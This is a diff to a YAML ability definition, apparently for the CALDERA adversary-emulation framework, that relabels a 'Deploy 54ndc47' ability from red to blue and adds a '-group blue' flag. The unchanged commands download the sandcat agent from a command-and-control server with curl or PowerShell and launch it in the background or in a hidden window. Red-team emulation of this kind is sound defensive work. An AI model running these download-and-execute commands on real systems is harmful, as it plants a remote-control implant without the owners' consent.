@@ -1,7 +1,7 @@
 ---
 
-- id: 2f34977d-9558-4c12-abad-349716777c6b
-  name: Deploy 54ndc47 (red)
+- id: b02f97e2-6be3-4583-9080-7c3b1e7b573e
+  name: Deploy 54ndc47 (blue)
   description: Start a new HTTP agent
   tactic: execution
   technique:
@@ -13,13 +13,13 @@
         command: |
           server="#{app.contact.http}";
           agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:darwin" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
-          nohup ./$agent -server $server &
+          nohup ./$agent -server $server -group blue &
     linux:
       sh:
         command: |
           server="#{app.contact.http}";
           agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
-          nohup ./$agent -server $server &
+          nohup ./$agent -server $server -group blue &
     windows:
       psh:
         command: |
@@ -29,4 +29,4 @@
           $wc.Headers.add("platform","windows");
           $wc.Headers.add("file","sandcat.go");
           ($data=$wc.DownloadData($url)) -and ($name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","")) -and ([io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data)) | Out-Null;
-          Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-server $server" -WindowStyle hidden;
+          Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-server $server -group blue" -WindowStyle hidden;
